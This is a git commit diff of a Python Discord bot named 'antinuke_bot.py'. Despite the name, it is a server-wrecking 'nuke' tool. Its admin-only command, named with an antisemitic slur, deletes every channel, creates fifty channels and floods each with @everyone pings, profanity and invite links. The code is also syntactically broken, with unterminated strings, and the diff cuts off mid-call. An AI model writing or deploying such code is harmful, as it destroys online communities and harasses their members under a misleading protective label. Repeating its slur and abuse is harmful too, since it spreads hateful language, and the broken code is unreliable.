67c30c31be4b2817992b45752f1ebbd49b95464c
mominali20ff-prog <mominali20ff@gmail.com>
2026-06-13 21:34:44 +0100

    antinuke_bot.py

--- antinuke_bot.py
+++ antinuke_bot.py
@@ -1,36 +1,21 @@
-import discord
-from discord.ext import commands
-import os
-
-TOKEN = os.environ["DISCORD_TOKEN"]
-
-intents = discord.Intents.default()
-intents.message_content = True
-intents.guilds = True
-
-bot = commands.Bot(command_prefix=".", intents=intents)
-
-@bot.event
-async def on_ready():
-    print(f"Logged in as {bot.user}")
-
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def jew(ctx):
-    await ctx.send("⚙️ Creating channels...")
+    await ctx.send("your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKdD
+    .")
 
-    message = '''
-@everyone fuck off you are nuked LMAO 
-https://discord.gg/bTpSAcNWGK
-https://discord.gg/bTpSAcNWGK
-https://discord.gg/bTpSAcNWGK
-https://discord.gg/bTpSAcNWGK
-'''
+    # Delete existing channels
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
 
+    # Create new channels
     for i in range(1, 51):
         channel = await ctx.guild.create_text_channel(f"general-{i}")
-        await channel.send(message)
-
-    await ctx.send("✅ Finished creating 50 channels.")
-
-bot.run(TOKEN)
+        await channel.send(
+            "👋 Welcome You guys got nuked mf 
+        @everyone 
+        @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone 
+        https://discord.gg/RY5gS7yKdD
